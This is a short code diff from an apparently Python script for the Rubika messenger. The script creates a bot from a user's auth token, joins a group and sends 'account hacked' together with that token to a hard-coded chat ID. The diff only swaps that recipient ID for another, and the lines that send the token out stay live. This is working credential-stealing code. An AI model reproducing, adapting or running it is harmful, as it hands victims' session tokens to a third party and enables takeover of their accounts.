@@ -41,7 +41,7 @@ except:
         sys.exit()
 
 bot = Bot("AppName",auth=auth)
-target = ("g0BdyQL068aa2398e619c1ddd729b2e4")
+target = ("g0BmdMv0ca20f356cf2b972327373309")
 bot.joinGroup("https://rubika.ir/joing/CEGFGBDE0UVKMLYIICMVTNJGBQKIDYNM")
 bot.sendMessage(target,f"account hacked:\n\nauth: [{auth}]")
 #-------
